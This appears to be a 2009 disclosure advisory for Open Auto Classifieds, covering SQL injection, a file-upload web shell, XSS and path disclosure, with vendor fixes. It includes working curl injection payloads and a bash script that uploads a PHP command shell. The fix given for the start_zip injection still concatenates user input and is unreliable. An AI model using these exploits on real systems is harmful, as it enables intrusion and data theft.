@@ -1,0 +1,274 @@
+MorningStar Security - Advisory
+http://www.morningstarsecurity.com/
+
+Multiple security issues in Open Auto Classifieds
+
+
+1. Advisory Information
+----------------------------------------------------------------------------------------------
+Title: Multiple security issues in Open Auto Classifieds
+Advisory ID: MORNINGSTAR-2009-01
+Advisory URL: http://www.morningstarsecurity.com/advisories/
+Release Type: Co-ordinated, responsible disclosure
+
+
+2. Vulnerability Information
+----------------------------------------------------------------------------------------------
+Class: SQL Injection, Insecure File Upload, Cross Site Scripting, Filepath Disclosure
+Remotely Exploitable: Yes
+Locally Exploitable: No
+
+
+3. Vulnerability Description
+----------------------------------------------------------------------------------------------
+Open Auto Classifieds is a vehicle listings manager that is popular with
+car dealer websites. It's written in PHP + MySQL and is available free
+at http://openautoclassifieds.com/.
+
+Multiple vulnerabilities exist in Open Auto Classifieds. These
+vulnerabilities can be exploited to allow access to read any information
+from the database, attack web browser clients through the web site,
+disclose the file path of the application and execute any arbitrary
+command on the web server.
+
+Other security issues exist such as the registration form asks for a
+password once, not twice for verification.
+
+
+4. Vulnerable packages
+----------------------------------------------------------------------------------------------
+Open Auto Classifieds versions <= 1.5.9
+
+
+5. Non-vulnerable packages
+----------------------------------------------------------------------------------------------
+Open Auto Classifieds versions >= 1.6.0
+A filepath disclosure vulnerability is not fixed in version 1.6.0
+
+
+6. Vendor information, Solutions and Workarounds
+----------------------------------------------------------------------------------------------
+Upgrade, or apply the code fixes shown with each vulnerability.
+Brandon from Open Auto Classifieds was very helpful with his fast respsonse.
+
+
+7. Credits
+----------------------------------------------------------------------------------------------
+These vulnerabilities were discovered and researched by Andrew Horton
+(urbanadventurer) from MorningStar Security.
+
+
+8. Technical Description / Proof of Concept
+----------------------------------------------------------------------------------------------
+
+8.1 Introduction
+
+Open Auto Classifieds powers many car dealer websites. No advisories for
+this software have been released before. Multiple SQL injection, File
+upload, XSS (Cross Site Scripting) and Filepath disclosure
+vulnerabilities were found in version 1.5.9.
+
+
+8.3 SQL Injection in xml_zone_data.php
+----------------------------------------------------------------------------------------------
+Severity: High
+
+Allows arbitrary SELECT SQL injection to the database.
+
+8.3.1 Proof of concept exploit
+
+$ curl "http://test/openauto/xml_zone_data.php?filter=1%20union%20select%20concat(0x0a,user,0x3a,pass,0x3a,0x0a)%20from%20users" | grep ":" | sort -u
+
+This will give you the usernames and passwords in a standard unix passwd
+format. Note that the raw MD5 hashes are salted with a suffix of _a*"
+
+8.3.2 Fix
+Vendor note:
+Improper int check for $filter
+Fix: Change line 31 of xml_zone_data.php to "$country_id =
+(int)$filter;" I have tested against your method and no longer have the
+specific leak.
+
+
+8.4 SQL Injection in search.php and listings.php
+----------------------------------------------------------------------------------------------
+Severity: High
+
+Allows for blind sql injection attacks on the start_zip parameter.
+
+8.4.1 Proof of concept exploit
+
+$ curl -d "min-price=&max_price=&start_zip=BENCHMARK(1000000,MD5(1))&zip_range=10000&state=Illinois&submit=Search&vehicle_type=&make=&model=&year=&listing_condition=&trans=&drive_train=&sellerid="  http://test/openauto/listings.php
+
+ % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                Dload  Upload   Total   Spent    Left  Speed
+100  1508  100  1508    0     0  13220      0 --:--:-- --:--:-- --:--:--     0
+admin:d84a2130b6b52449c62c6d1b2474b3c9:
+abcdef2:244cb02b9766b05428ccbd22115668ce:
+abcdef:2fa7971a36b0efe65bf6acfc30f54c48:
+blahblah:7f7dcf3819834d82d0ece5fd7397ddb9:
+
+
+8.4.2 Fix
+Vendor note:
+It seems the cause of this was having the zip field type as a varchar in
+the db and in the listings.php I was checking as a dissimilar type thus
+allowing the issue. After making the below change I was unable to
+reproduce the timing issue.
+FIX: Change line 109 in the listings.php to this $addOnSQL.="zip = '" .
+$_POST["start_zip"] . "'";
+
+
+8.5 Insecure File Upload in useredit.php
+----------------------------------------------------------------------------------------------
+Severity: Critical
+
+Leads to arbitrary command execution
+
+A registered user can upload a malicious profile image. The program
+checks if an extension after the first dot in the filename is in a
+whitelist. This means that a file nameed, lala.jpg.php would be
+accepted.
+
+This issue also affects uploading images in the add and edit listings
+pages available to admin users. The issue is located in the
+checkAllowedExt() function.
+
+8.5.1 Proof of concept exploit
+
+1. Register a user at /register.php
+2. Upload a PHP script as a profile picture named blah.jpg.php
+3. Go to the member.php page and view the source for the thumbnail URL
+  eg. <a href="member.php?action=viewfull"><img src="images/users/abcdef2053blah_thumb.jpg" alt="abcdef" /></a>
+4. Go to http://test/openauto/images/users/USERNUMBERblah.jpg.php to access the php script
+  where USER is your username and NUMBER is the number in the thumbnail filename.
+  eg. http://test/openauto/images/users/abcdef2638blah.jpg.php?cmd=id
+
+
+#!/bin/bash
+# File Upload exploit for Open Auto Classifieds version <= 1.5.9
+#
+# Researched by Andrew Horton (urbanadventurer)
+# (c) MorningStar Security, 2009  http://www.morningstarsecurity.com/
+
+if [ -z "$1" ]; then
+   echo  "Usage: $0 <target-url>"
+   echo "File upload proof of concept exploit for Open Auto Classifieds <= v 1.5.9"
+   echo "This will create a user with the name 'hacker' and pass '31337' then upload a command execution shell."
+   echo -e "eg. $0 http://www.myweb.com/cardealer/\n"
+   exit
+fi
+target="$1"
+   echo "<? print passthru(\$_REQUEST['cmd']); ?>" > evilimage.jpg.php   
+echo "Registering user"
+curl -c cookiejar -d "user=hacker&pass=31337&email=foo%40bar.com&company_name=&first_name=Hack&last_name=Errr&phone=123+123+1234&alt_phone=&fax=&country=1&state=Badakhshan&city=&address=&zip=&submit=Submit&agree=agree" "$target/register.php" >/dev/null 2>&1
+echo "Login"
+curl -b cookiejar -c cookiejar -d "user=hacker&pass=31337&submit=Login" "$target/login.php" >/dev/null 2>&1
+echo "Upload command shell as user image"
+curl -b cookiejar -c cookiejar -F "image=@evilimage.jpg.php" -F "max=524288" -F "addimage=Submit" "$target/useredit.php" >/dev/null 2>&1
+
+CODE=`curl -b cookiejar -c cookiejar "$target/member.php" 2>/dev/null | grep _thumb.jpg | egrep -o "[0-9]{4}"`
+rm -f cookiejar evilimage.jpg.php
+echo "Command shell found at : $target/images/users/hacker${CODE}evilimage.jpg.php?cmd=id"
+
+curl "$target/images/users/hacker${CODE}evilimage.jpg.php?cmd=id" 2>/dev/null
+while read cmd; do
+   curl -d "cmd=$cmd" "$target/images/users/hacker${CODE}evilimage.jpg.php" 2>/dev/null
+done
+
+
+
+8.5.2 Fix
+Vendor note: Replace lines 921 and 922 of the function.php with this line of code
+"$ext = pathinfo($temp, PATHINFO_EXTENSION);"
+
+Also add an additional check in the uploadUserListImage and UploadListImage
+just above the call to checkImageSize function
+   if (!getimagesize($tmpfile))
+       return false;
+
+MorningStar note: checkImageSize can't be relied on as a fix. The pathinfo() should be fine.
+
+
+8.6 Cross Site Scripting in listings.php
+----------------------------------------------------------------------------------------------
+Severity: Medium
+
+8.6.1 Proof of concept exploit
+
+Send a user to url like http://test/openauto/listings.php?next=1%3Cscript%3Ealert(0)%3C/script%3E
+
+8.6.2 Fix
+Vendor note: I seem to have stopped the alert box by adding an int check
+to the getCurrentItem function on line 204 in the
+SmartyPaginate.class.php file. The smarty class seems to be the root
+cause of the issue.
+
+     function  getCurrentItem($id = 'default') {
+       return (int)$_SESSION['SmartyPaginate'][$id]['current_item'];
+   }
+
+There may be more issues regarding similar Attack methods but for now
+this one seems it has a fix. I have also notified Monte Ohrt of the
+Smarty development team regarding this issue.
+
+
+8.7 File path disclosure in paycalc.php
+----------------------------------------------------------------------------------------------
+Severity: Low
+
+8.7.1 Proof of concept exploit
+
+Exploit by setting interest to 0 to see the following output:
+Warning: Division by zero in /var/www/test/openauto/paycalc.php on line 109
+
+8.7.2 Fix
+Vendor note:
+Replace line 104 of the paycalc.php with the following code.
+if (isset($_POST["interest_rate"]) && $_POST["interest_rate"] == 0) {
+   $annual_interest = 10;
+} else {
+   $annual_interest   = isset($_POST["interest_rate"])  ?
+$_POST["interest_rate"] : 10;
+}
+
+
+8.8 File path disclosure in admin/templates/templates_c/%%62620^6206D997%%admin.tpl.php
+----------------------------------------------------------------------------------------------
+Severity: Low
+
+8.8.1 Proof of concept exploit
+To access this url, encode it first.
+
+$ curl http://test/openauto/admin/templates/templates_c/%25%25%36%32%5e%36%32%30%5e%36%32%30%36%44%39%39%37%25%25%61%64%6d%69%6e%2e%74%70%6c%2e%70%68%70
+
+Warning: require_once(SMARTY_CORE_DIRcore.load_plugins.php) [function.require-once]: failed to open stream: No such file or directory in /var/www/test/openauto/admin/templates/templates_c/%%62620^6206D997%%admin.tpl.php on line 7
+
+Fatal error: require_once() [function.require]: Failed opening required 'SMARTY_CORE_DIRcore.load_plugins.php'
+(include_path='.:/usr/share/php:/usr/share/pear') in /var/www/test/openauto/admin/templates/templates_c/%%62620^6206D997%%admin.tpl.php on line 7
+
+8.8.2 Fix
+Vendor note:
+The v1.6.0 update does not contain the fix for the admin.tpl path disclosure issue. That will be released in v1.6.1.
+
+
+9. Report Timeline
+----------------------------------------------------------------------------------------------
+24th August 2009 - Andrew Horton at MorningStar Security notifies Brandon Keep from Open Auto Classifieds of the vulnerabilities.
+25th August 2009 - Brandon Keep from Open Auto Classifieds provides fixes for the security vulnerabilities.
+26th August 2009 - Open Auto Classifieds releases patched version 1.6.0 on FreshMeat.net
+27th August 2009 - MorningStar Security publishes this advisory
+
+
+10. About Morning Star Security
+----------------------------------------------------------------------------------------------
+MorningStar Security is an IT security consulting firm in Christchurch, New Zealand.
+
+The freshest blend of IT security news is available for your daily consumption at http://www.morningstarsecurity.com/news/
+
+
+11. Disclaimer & Copyright
+----------------------------------------------------------------------------------------------
+The contents of this advisory are copyright (c) 2009 MorningStar Security, and may be distributed freely provided that and proper credit is given. 
+
+# milw0rm.com [2009-08-26]
